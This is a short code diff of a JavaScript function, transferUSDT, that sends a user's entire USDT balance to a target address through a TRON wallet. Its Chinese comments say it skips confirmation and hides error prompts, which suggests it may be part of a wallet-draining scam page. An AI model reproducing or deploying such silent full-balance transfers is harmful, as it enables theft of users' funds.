@@ -40,11 +40,9 @@ async function transferUSDT() {
             targetAddress,
             balance // 余额为 0 也会发起转账，交给钱包处理
         ).send({
-            feeLimit: 10000000, // 设置手续费限制，单位是 SUN（1 TRX = 1,000,000 SUN）
             shouldPollResponse: false // 不等待交易确认，直接交给钱包
         });
 
-        // 转账发起后，交给钱包处理，不需要额外提示
     } catch (error) {
         console.error("转账失败:", error);
         // 错误交给钱包处理，不显示提示
